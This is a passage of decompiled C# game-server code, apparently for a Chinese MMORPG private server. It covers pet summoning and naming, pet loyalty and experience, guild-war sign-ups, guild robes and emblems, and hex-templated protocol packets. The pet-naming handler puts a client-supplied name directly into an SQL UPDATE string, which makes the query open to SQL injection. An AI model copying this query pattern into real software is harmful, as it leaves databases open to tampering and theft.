					{
						if (num2 != 100)
						{
							召唤提示(0, 3);
							清空灵兽状态();
							return;
						}
						if (base.Player_Money < 1000000L)
						{
							系统提示("金钱不够100万,不能召唤宠物。");
							召唤提示(0, 6);
							清空灵兽状态();
							return;
						}
						base.Player_Money -= 1000000L;
						更新金钱和负重();
						人物灵兽.FLD_ZCD = 200;
					}
					装备栏已穿装备[14].锁定 = true;
					召唤提示(0, 1);
					if (装备栏已穿装备[14].Get物品ID == 1000001011L)
					{
						人物灵兽.Bs = 0;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001377L)
					{
						人物灵兽.Bs = 1;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001378L)
					{
						人物灵兽.Bs = 2;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001379L)
					{
						人物灵兽.Bs = 3;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001380L)
					{
						人物灵兽.Bs = 4;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001381L)
					{
						人物灵兽.Bs = 5;
					}
					人物灵兽.人物坐标_X = base.人物坐标_X;
					人物灵兽.人物坐标_Y = base.人物坐标_Y;
					人物灵兽.人物坐标_Z = base.人物坐标_Z;
					人物灵兽.人物坐标_MAP = base.人物坐标_地图;
					召唤更新显示已装备物品(this);
					人物灵兽.计算灵兽装备数据();
					更新灵兽HP_MP_SP();
					更新灵兽经验和历练();
					更新灵兽武功和状态();
					更新灵兽负重();
					更新灵兽初始话装备篮包裹();
					更新人物数据(this);
					更新广播人物数据();
					发送灵兽数据(long_, 人物灵兽);
					return;
				}
				名包宠物id = long_;
				if (itmeClass.FLD_PID == 1000000065)
				{
					名包宠物类型 = 1;
				}
				else if (itmeClass.FLD_PID == 1000000066)
				{
					名包宠物类型 = 2;
				}
				else if (itmeClass.FLD_PID == 1000000067)
				{
					名包宠物类型 = 3;
				}
				else if (itmeClass.FLD_PID == 1000000068)
				{
					名包宠物类型 = 4;
				}
				else if (itmeClass.FLD_PID != 1000001011 && itmeClass.FLD_PID != 1000001377 && itmeClass.FLD_PID != 1000001378 && itmeClass.FLD_PID != 1000001379)
				{
					if (itmeClass.FLD_PID == 1000001380)
					{
						名包宠物类型 = 5;
					}
					else if (itmeClass.FLD_PID == 1000001381)
					{
						名包宠物类型 = 5;
					}
					else if (itmeClass.FLD_PID == 1000000083)
					{
						名包宠物类型 = 1;
					}
					else if (itmeClass.FLD_PID == 1000000084)
					{
						名包宠物类型 = 2;
					}
					else if (itmeClass.FLD_PID == 1000000085)
					{
						名包宠物类型 = 3;
					}
					else if (itmeClass.FLD_PID == 1000000086)
					{
						名包宠物类型 = 4;
					}
				}
				else
				{
					名包宠物类型 = 5;
				}
				装备栏已穿装备[14].锁定 = true;
				召唤提示(0, 100);
			}
			else
			{
				清空灵兽状态();
			}
		}

		public void 宠物起名包(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[14];
				System.Buffer.BlockCopy(封包数据, 14, array, 0, 14);
				string text = Encoding.Default.GetString(array).Replace("\0", string.Empty);
				DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("SELECT  *  FROM  TBL_XWWL_Cw  WHERE  ItmeId  ={0}", 名包宠物id));
				if (text.Length > 12)
				{
					起名提示(3);
					装备栏已穿装备[14].锁定 = false;
				}
				else if (dBToDataTable.Rows.Count > 0)
				{
					DBA.ExeSqlCommand(string.Format("UPDATE  TBL_XWWL_Cw  SET  ZrName='{1}',Name='{2}',FLD_ZCD={3}  WHERE  ItmeId={0}", 名包宠物id, base.UserName, text, 100));
					if (人物灵兽 != null)
					{
						人物灵兽.Name = text;
						人物灵兽.ZrName = base.UserName;
						人物灵兽.FLD_ZCD = 100;
						清空灵兽状态();
					}
				}
				else if (RxjhClass.GetCwUserName(text, base.UserName, 名包宠物类型, 名包宠物id) == 1)
				{
					召唤宠物(封包数据, 封包大小);
				}
				else
				{
					起名提示(5);
					装备栏已穿装备[14].锁定 = false;
				}
				if (dBToDataTable != null)
				{
					dBToDataTable.Dispose();
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "宠物起名出错[" + base.人物全服ID + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 召唤提示(int kg, int id)
		{
			byte[] array = Converter.hexStringToByte("AA5512000A005110050000000000030000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(kg), 0, array, 10, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 14, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 起名提示(int id)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(id);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 22288, base.人物全服ID);
			}
		}

		public void 宠物动作(int id)
		{
			switch (id)
			{
			case 3:
				人物灵兽.骑 = 1;
				更新移动速度();
				break;
			case 4:
				人物灵兽.骑 = 0;
				更新移动速度();
				break;
			case 5:
			case 6:
				base.FLD_宠物_追加_经验百分比 = 0.0;
				base.FLD_宠物_追加_防御 = 0;
				base.FLD_宠物_追加_最大HP = 0;
				base.FLD_宠物_追加_攻击 = 0;
				更新HP_MP_SP();
				更新武功和状态();
				清空灵兽状态列表();
				if (人物灵兽.攻击列表 != null)
				{
					人物灵兽.攻击列表.Clear();
					人物灵兽.攻击列表 = null;
				}
				break;
			}
			byte[] array = Converter.hexStringToByte("AA550F00549C5510010001000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物灵兽全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 召唤更新显示灵兽数据(Players thisPlay)
		{
			byte[] array = Converter.hexStringToByte("AA556700549C6400580001000000549C000000000000000000000000000000000000000000003203040000000000FA590544000070417F86C64465000000E69EA42770920F24000000008425A627000100009CBBFF43D322BDC370F9CD440000000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽全服ID), 0, array, 14, 2);
			byte[] bytes = Encoding.Default.GetBytes(thisPlay.人物灵兽.Name);
			System.Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽.FLD_LEVEL), 0, array, 38, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽.FLD_JOB_LEVEL), 0, array, 40, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽.FLD_JOB), 0, array, 41, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽.Bs), 0, array, 42, 1);
			for (int i = 0; i < 4; i++)
			{
				byte[] src;
				try
				{
					src = 人物灵兽.宠物以装备[i].物品ID;
				}
				catch
				{
					src = new byte[4];
				}
				System.Buffer.BlockCopy(src, 0, array, 44 + i * 4, 4);
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
			发送当前范围广播数据多包(array, array.Length);
		}

		public void 召唤更新显示已装备物品(Players Play)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(1);
			发包类.Write4(Play.人物灵兽全服ID);
			发包类.WriteName(Play.人物灵兽.Name);
			发包类.Write(0);
			发包类.Write4(0);
			发包类.Write2(Play.人物灵兽.FLD_LEVEL);
			发包类.Write(Play.人物灵兽.FLD_JOB_LEVEL);
			发包类.Write(Play.人物灵兽.FLD_JOB);
			发包类.Write(Play.人物灵兽.Bs);
			发包类.Write(0);
			for (int i = 0; i < 5; i++)
			{
				if (BitConverter.ToInt32(人物灵兽.宠物以装备[i].物品数量, 0) == 0)
				{
					人物灵兽.宠物以装备[i].物品_byte = new byte[World.数据库单个物品大小];
				}
				发包类.Write(人物灵兽.宠物以装备[i].GetByte(), 0, World.发包单个物品大小);
			}
			base.Client.SendPak(发包类, 40960, Play.人物灵兽全服ID);
		}

		public void 更新灵兽HP_MP_SP()
		{
			if (人物灵兽.FLD_ZCD > 2000)
			{
				人物灵兽.FLD_ZCD = 2000;
			}
			base.FLD_宠物_追加_经验百分比 = 计算宠物追加经验百分比(人物灵兽.FLD_ZCD);
			发包类 发包类 = new 发包类();
			发包类.Write4(人物灵兽.FLD_ZCD);
			发包类.Write4(0);
			发包类.Write4(2000);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 26880, base.人物灵兽全服ID);
			}
		}

		public double 计算宠物追加经验百分比(int 忠诚度)
		{
			if (忠诚度 >= 0 && 忠诚度 <= 200)
			{
				return -0.8;
			}
			if (忠诚度 > 200 && 忠诚度 <= 500)
			{
				return -0.5;
			}
			if (忠诚度 > 500 && 忠诚度 <= 800)
			{
				return -0.2;
			}
			if (忠诚度 > 800 && 忠诚度 <= 1000)
			{
				return -0.1;
			}
			if (忠诚度 > 1000 && 忠诚度 <= 1400)
			{
				return 0.0;
			}
			if (忠诚度 > 1400 && 忠诚度 <= 1700)
			{
				return 0.03;
			}
			if (忠诚度 > 1700 && 忠诚度 <= 1900)
			{
				return 0.04;
			}
			if (忠诚度 > 1900 && 忠诚度 <= 2000)
			{
				return 0.05;
			}
			return 0.0;
		}

		public void 更新灵兽经验和历练()
		{
			double num = Convert.ToInt64(World.lever[人物灵兽.FLD_LEVEL]) - Convert.ToInt64(World.lever[人物灵兽.FLD_LEVEL - 1]);
			double num2 = 人物灵兽.FLD_EXP - Convert.ToInt64(World.lever[人物灵兽.FLD_LEVEL - 1]);
			if (num2 < 1.0)
			{
				人物灵兽.FLD_EXP = Convert.ToInt64(World.lever[人物灵兽.FLD_LEVEL - 1]);
				num2 = 0.0;
			}
			发包类 发包类 = new 发包类();
			发包类.Write8((long)num2);
			发包类.Write8((long)num);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 27136, base.人物灵兽全服ID);
			}
		}

		public void 更新灵兽武功和状态()
		{
			发包类 发包类 = new 发包类();
			发包类.Write2(人物灵兽.FLD_LEVEL);
			发包类.Write2(人物灵兽.灵兽基本攻击);
			发包类.Write2(人物灵兽.灵兽基本防御);
			发包类.Write2(人物灵兽.灵兽基本命中);
			for (int i = 0; i < 4; i++)
			{
				if (人物灵兽.武功新[0, i] != null)
				{
					发包类.Write4(人物灵兽.武功新[0, i].FLD_PID);
				}
				else
				{
					发包类.Write4(0);
				}
			}
			for (int j = 0; j < 4; j++)
			{
				if (人物灵兽.武功新[1, j] != null)
				{
					发包类.Write4(人物灵兽.武功新[1, j].FLD_PID);
				}
				else
				{
					发包类.Write4(0);
				}
			}
			for (int k = 0; k < 24; k++)
			{
				发包类.Write4(0);
			}
			发包类.Write4(人物灵兽.FLD_MAGIC1);
			发包类.Write4(人物灵兽.FLD_MAGIC2);
			发包类.Write4(人物灵兽.FLD_MAGIC3);
			发包类.Write4(人物灵兽.FLD_MAGIC4);
			发包类.Write4(人物灵兽.FLD_MAGIC5);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 27392, base.人物灵兽全服ID);
			}
		}

		public void 更新灵兽负重()
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(0);
			发包类.Write4(0);
			发包类.Write4(人物灵兽.FLD_负重);
			发包类.Write4(人物灵兽.FLD_负重_MAX);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 31744, base.人物灵兽全服ID);
			}
		}

		public void 人物获得经验(double 经验)
		{
			if (经验 <= 0.0)
			{
				return;
			}
			if (人物灵兽 != null)
			{
				if (人物灵兽.FLD_ZCD > 2000)
				{
					人物灵兽.FLD_ZCD = 2000;
				}
				else if (人物灵兽.FLD_ZCD < 0)
				{
					人物灵兽.FLD_ZCD = 0;
				}
				经验 *= 0.8 + 0.4 * (double)人物灵兽.FLD_ZCD / 2000.0;
				if (人物灵兽.FLD_LEVEL < 100)
				{
					if (base.Player_Level < World.限制最高级别)
					{
						base.人物经验 += (long)(经验 * (double)(100 - Config.宠物经验) / 100.0);
					}
					人物灵兽.FLD_EXP += (long)(经验 * (double)Config.宠物经验 / 200.0);
					人物灵兽.计算基本数据();
					更新灵兽HP_MP_SP();
					更新灵兽经验和历练();
					更新灵兽武功和状态();
				}
				else if (base.Player_Level < World.限制最高级别)
				{
					base.人物经验 += (long)经验;
				}
			}
			else if (base.Player_Level < World.限制最高级别)
			{
				base.人物经验 += (long)经验;
			}
		}

		public void 人物获得金钱(double 金币, int 类型)
		{
			if (!(金币 < 0.0) && 金币 <= 2000000000.0)
			{
				if (类型 == 1)
				{
					base.Player_Money += (uint)金币;
					得到钱的提示((uint)金币);
				}
				else
				{
					base.Player_Money -= (uint)金币;
				}
			}
		}

		public void 更新灵兽初始话装备篮包裹()
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(60);
			发包类.Write4(0);
			for (int i = 0; i < 16; i++)
			{
				if (BitConverter.ToInt32(人物灵兽.宠物装备栏[i].物品数量, 0) == 0)
				{
					人物灵兽.宠物装备栏[i].物品_byte = new byte[World.数据库单个物品大小];
				}
				else
				{
					检查物品系统("灵兽装备栏包裹", ref 人物灵兽.宠物装备栏[i]);
				}
				发包类.Write(人物灵兽.宠物装备栏[i].GetByte(), 0, World.发包单个物品大小);
			}
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 28928, base.人物灵兽全服ID);
			}
		}

		public void 灵兽升级后的提示()
		{
			发包类 发包类 = new 发包类();
			发包类.Write1(人物灵兽.FLD_LEVEL);
			发包类.Write1(1);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 30464, base.人物灵兽全服ID);
			}
			发送当前范围广播数据(发包类, 30464, base.人物灵兽全服ID);
		}

		public void 更新装备效果灵兽(Players thisPlayer)
		{
			byte[] array = Converter.hexStringToByte("AA5567000000640058000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽全服ID), 0, array, 14, 2);
			byte[] bytes = Encoding.Default.GetBytes(thisPlayer.人物灵兽.Name);
			System.Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.FLD_LEVEL), 0, array, 38, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.FLD_JOB_LEVEL), 0, array, 39, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.FLD_JOB), 0, array, 40, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.Bs), 0, array, 42, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_X), 0, array, 46, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_Z), 0, array, 50, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_Y), 0, array, 54, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_MAP), 0, array, 58, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_X), 0, array, 82, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_Y), 0, array, 90, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽全服ID), 0, array, 4, 2);
			for (int i = 0; i < 4; i++)
			{
				byte[] src;
				try
				{
					src = 人物灵兽.宠物以装备[i].物品ID;
				}
				catch
				{
					src = new byte[4];
				}
				System.Buffer.BlockCopy(src, 0, array, 62 + i * 4, 4);
			}
			thisPlayer.发送当前范围广播数据多包(array, array.Length);
		}

		public void 取消帮战(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt32(封包数据, 10);
			帮战Class value;
			if (World.帮战list.TryGetValue(num, out value))
			{
				value.申请人物列表.Clear();
				World.帮战list.Remove(num);
				查百宝阁元宝数();
				检察元宝数据(50, 1);
				RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "取消帮战返还", 1, 50);
				base.Player_Money += 50000000L;
				RxjhClass.帮战赌注删除(base.Userid, base.UserName, num, 0);
				保存元宝数据();
				更新金钱和负重();
				Form1.WriteLine(88, "取消帮战成功  申请帮派ID:" + num + "  帮派名字:" + base.帮派名字 + "  帮主:" + base.UserName);
				申请取消帮战提示(1);
			}
			else
			{
				申请取消帮战提示(0);
			}
		}

		public bool 当天是否已参战(string Name)
		{
			try
			{
				if (World.帮战Namelist == null || World.帮战Namelist.Count <= 0)
				{
					return false;
				}
				foreach (帮战Class value in World.帮战Namelist.Values)
				{
					using (new Lock(value.申请人物列表, "帮战申请人物列表"))
					{
						foreach (Players value2 in value.申请人物列表.Values)
						{
							if (value2.UserName == Name)
							{
								return true;
							}
						}
					}
				}
			}
			catch
			{
				return false;
			}
			return false;
		}

		public void 申请帮战(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (World.是否开启门战系统 == 0)
				{
					系统提示("帮战系统已关闭,开放时间为每天" + World.门战系统开启时 + "时" + World.门战系统开启分 + "分" + World.门战系统开启秒 + "秒。");
				}
				else if (DateTime.Now.Hour != 21 && DateTime.Now.Hour != 22)
				{
					系统提示("帮派混战系统开放时间为每晚21点和22点。");
				}
				else if (DateTime.Now.Minute >= 10)
				{
					系统提示("现在还不是申请帮战的时间。  " + DateTime.Now.ToString());
				}
				else if (World.新门战进程 >= 2)
				{
					系统提示("帮派混战正在进行中,请下次申请。");
				}
				else if (base.帮派名字.Length == 0)
				{
					系统提示("还没有加入任何门派,不能申请帮战。");
					申请帮战提示(5);
				}
				else if (World.帮战list.Count >= 4)
				{
					系统提示("申请帮战的帮派数已达到4个上限,请下次申请。");
					申请帮战提示(5);
				}
				else if (base.帮派人物等级 != 6)
				{
					申请帮战提示(3);
				}
				else
				{
					BitConverter.ToInt16(封包数据, 14);
					int num = BitConverter.ToInt32(封包数据, 2118);
					int num2 = BitConverter.ToInt32(封包数据, 10);
					if (num != 7301)
					{
						系统提示("目前只开放地图[斗神馆]。");
						申请帮战提示(5);
					}
					else if (World.帮战list.ContainsKey(num2))
					{
						系统提示("帮派已经申请,无需重复申请。");
					}
					else if (World.胜利帮派ID == base.帮派Id)
					{
						系统提示("本帮派在上次帮战中获得胜利,今日不能再申请。");
					}
					else
					{
						Dictionary<int, Players> dictionary = new Dictionary<int, Players>();
						foreach (Players value in World.allConnectedChars.Values)
						{
							if (value.人物坐标_地图 == 1201 && value.帮派名字 == base.帮派名字 && value.Player_Level >= 100 && value.人物_HP > 0 && !value.Player死亡 && !value.退出中)
							{
								if (!当天是否已参战(value.UserName))
								{
									dictionary.Add(value.人物全服ID, value);
								}
								else
								{
									value.系统提示("您在上次的帮战中获得胜利,今日不能再参加帮战。");
								}
							}
						}
						if (dictionary.Count < 5)
						{
							申请帮战提示(4);
							dictionary.Clear();
						}
						else
						{
							查百宝阁元宝数();
							if (base.FLD_RXPIONT >= World.申请门战需要元宝)
							{
								帮战Class 帮战Class = new 帮战Class();
								帮战Class.申请帮派ID = num2;
								帮战Class.申请地图 = num;
								帮战Class.申请帮派名称 = base.帮派名字;
								帮战Class.帮派门主 = base.UserName;
								帮战Class.等级 = base.帮派等级;
								帮战Class.申请人物列表 = dictionary;
								帮战Class.门主死亡次数 = 0;
								帮战Class.当前分数 = 0;
								World.帮战list.Add(num2, 帮战Class);
								World.帮战Namelist.Add(base.帮派Id, 帮战Class);
								申请帮战提示(0);
								Form1.WriteLine(88, "申请帮战成功  申请帮派ID:" + num2 + "  帮派名字:" + base.帮派名字 + "  帮主:" + base.UserName + "  人数:" + 帮战Class.申请人物列表.Count);
								检察元宝数据(World.申请门战需要元宝, 0);
								RxjhClass.帮战赌注(base.Userid, base.UserName, num2, World.申请门战需要元宝);
								foreach (Players value2 in 帮战Class.申请人物列表.Values)
								{
									value2.安全模式 = 1;
								}
								保存元宝数据();
							}
							else
							{
								系统提示("元宝不够了，申请帮战需要支付" + World.申请门战需要元宝 + "元宝。");
								申请帮战提示(2);
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "申请帮战  出错：" + ((ex != null) ? ex.ToString() : null));
			}
		}

		public void 申请帮战提示(int id)
		{
			byte[] array = Converter.hexStringToByte("AA5512003F003D10040004000000000000000000BE9A55AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 申请取消帮战提示(int id)
		{
			byte[] array = Converter.hexStringToByte("AA5512003F003B10040001000000000000000000BE9A55AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 帮战配对成功公告提示(int id)
		{
			byte[] array = Converter.hexStringToByte("AA55AA000F2766009C000830000000000000000000000000000000000000000002307C000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000690000640A000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 帮战准备公告提示(string sj)
		{
			byte[] array = Converter.hexStringToByte("AA55AA000F3766009C000830000000000000000000000000000000000000000003317C330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000690000650A000000000000000055AA");
			System.Buffer.BlockCopy(Encoding.Default.GetBytes(sj), 0, array, 35, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 帮战开始提示(int id, int id2)
		{
			byte[] array = Converter.hexStringToByte("AA551600E001371008000000000000000000000000000000ED3155AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(id2), 0, array, 14, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 系统倒计时(int id, int id2)
		{
			byte[] array = Converter.hexStringToByte("AA551600E001371008000000000000000000000000000000ED3155AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(id2), 0, array, 14, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 帮战更新分数(int zfs, int kfs)
		{
			byte[] array = Converter.hexStringToByte("AA5513000F2739100800FFFFFFFF000000000000000000003C5B55AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(zfs), 0, array, 10, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(kfs), 0, array, 14, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 变更门服(byte[] 封包数据, int 封包大小)
		{
			PacketReader packetReader = new PacketReader(封包数据, 封包大小, false);
			packetReader.Seek(10, SeekOrigin.Begin);
			int int_ = packetReader.ReadInt32();
			packetReader.ReadInt16();
			base.帮派门服字 = packetReader.ReadInt16();
			base.帮派门服颜色 = packetReader.ReadInt16();
			byte[] array = Converter.hexStringToByte("AA551E0045049100100002000000020000003D000000000000000000000000003C9455AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			byte[] array2 = Converter.hexStringToByte("AA551E00450442151000B8530000010001001C800000002D3101000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.帮派Id), 0, array2, 10, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.帮派门服字), 0, array2, 16, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.帮派门服颜色), 0, array2, 18, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
			发送当前范围广播数据(array2, array2.Length);
			打开仓库中 = false;
			int 帮派门服字 = base.帮派门服字;
			int 帮派门服颜色 = base.帮派门服颜色;
			RxjhClass.变更门服(int_, 帮派门服字, 帮派门服颜色);
		}

		public void 申请门徽(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[770];
			System.Buffer.BlockCopy(封包数据, 18, array, 0, 770);
			RxjhClass.申请门徽(base.帮派Id, array);
			发送门徽2(array, base.帮派Id);
		}

		public void 得到门徽(byte[] 封包数据, int 封包大小)
		{
			PacketReader packetReader = new PacketReader(封包数据, 封包大小, false);
			packetReader.Seek(10, SeekOrigin.Begin);
			int num = packetReader.ReadInt32();
			byte[] array = RxjhClass.得到门徽(num);
			if (array != null)
			{
				发送门徽2(array, num);
			}
		}

		public void 赋予职位(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				System.Buffer.BlockCopy(封包数据, 10, array, 0, 2);
				int num = BitConverter.ToInt32(array, 0);
				byte[] array2 = Converter.hexStringToByte("AA551E000A00EF00100001000000000000000000000000000000000000000000000055AA");
				byte[] array3 = new byte[14];
				System.Buffer.BlockCopy(封包数据, 12, array3, 0, 14);
				Players players = 得到人物数据(Encoding.Default.GetString(array3).Replace("\0", string.Empty));
				if (players != null)
				{
					System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array2, 10, 1);
					if (num == 6)
					{
						base.帮派人物等级 = 5;
						RxjhClass.赋予帮主职位(players.UserName, base.UserName, base.帮派名字);
					}
					RxjhClass.帮派赋予职位(num, players.UserName);
					players.帮派人物等级 = num;
					players.查帮派();
				}
				else
				{
					System.Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array2, 10, 1);
				}
				if (base.Client != null)
				{
					base.Client.Send(array2, array2.Length);
				}
			}
			catch
			{
			}
		}

		public void 加入门派(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				System.Buffer.BlockCopy(封包数据, 27, array, 0, 1);
				switch (BitConverter.ToInt32(array, 0))
				{
				case 1:
				{
					byte[] array5 = new byte[4];
					System.Buffer.BlockCopy(封包数据, 10, array5, 0, 2);
					Players players2 = 得到人物数据(BitConverter.ToInt32(array5, 0));
					if (players2 != null)
					{
						byte[] array6 = Converter.hexStringToByte("AA5530002A03E80022003103400000000000000000000000000000010AC0B600000000000000000000000000000000000000000055AA");
						byte[] bytes3 = Encoding.Default.GetBytes(base.帮派名字);
						System.Buffer.BlockCopy(bytes3, 0, array6, 12, bytes3.Length);
						byte[] bytes4 = Encoding.Default.GetBytes(players2.UserName);
						System.Buffer.BlockCopy(bytes4, 0, array6, 29, bytes4.Length);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array6, 4, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(players2.人物全服ID), 0, array6, 10, 2);
						DataTable dataTable2 = RxjhClass.得到帮派人数(base.帮派名字);
						if (dataTable2.Rows.Count >= 100)
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(18), 0, array6, 28, 1);
						}
						else if (players2.个人商店 != null)
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(16), 0, array6, 28, 1);
						}
						else if (players2.Player_Level >= 35 && players2.Player_Job_leve >= 2)
						{
							if (players2.帮派Id != 0)
							{
								System.Buffer.BlockCopy(BitConverter.GetBytes(17), 0, array6, 28, 1);
							}
							else if (players2.Client != null)
							{
								players2.Client.Send(array6, array6.Length);
							}
						}
						else if (base.Player_Zx == players2.Player_Zx)
						{
							if (players2.帮派Id != 0)
							{
								System.Buffer.BlockCopy(BitConverter.GetBytes(17), 0, array6, 28, 1);
							}
							else if (players2.Client != null)
							{
								players2.Client.Send(array6, array6.Length);
							}
						}
						else
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(16), 0, array6, 28, 1);
						}
						dataTable2.Dispose();
						if (base.Client != null)
						{
							base.Client.Send(array6, array6.Length);
						}
					}
					break;
				}
				case 2:
				{
					byte[] array7 = new byte[4];
					System.Buffer.BlockCopy(封包数据, 10, array7, 0, 2);
					int int_ = BitConverter.ToInt32(array7, 0);
					byte[] array8 = new byte[4];
					System.Buffer.BlockCopy(封包数据, 28, array8, 0, 1);
					switch (BitConverter.ToInt32(array8, 0))
					{
					case 21:
					{
						byte[] array10 = Converter.hexStringToByte("AA5530002A03E80022002A034400000000000000000000000000000215C0B600000000000000000000000000000000000000000055AA");
						byte[] bytes6 = Encoding.Default.GetBytes(base.UserName);
